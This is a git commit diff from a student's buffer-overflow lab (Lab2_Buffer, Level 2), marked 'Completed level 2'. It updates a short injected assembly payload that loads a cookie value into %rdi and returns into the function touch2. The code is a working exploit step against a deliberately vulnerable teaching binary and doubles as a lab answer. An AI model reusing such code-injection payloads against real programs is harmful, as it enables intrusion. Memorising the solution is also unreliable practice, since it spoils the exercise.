8088b966f6fa436ff6130b374f5c40ba0a11d512
Ryan Beck <ryan.beck1820@gmail.com>
2025-09-30 03:19:49 +0100

    Completed level 2

--- Lab2_Buffer/Level2/level2.s
+++ Lab2_Buffer/Level2/level2.s
@@ -1,2 +1,3 @@
-pushq 0x00000000004017f0	# push touch2 to stack
-ret				# return to touch2
+movq $0x1a7dd803, %rdi	# move cookie into rdi
+pushq $0x4017f0		# push touch2 to stack
+ret			# return to touch2
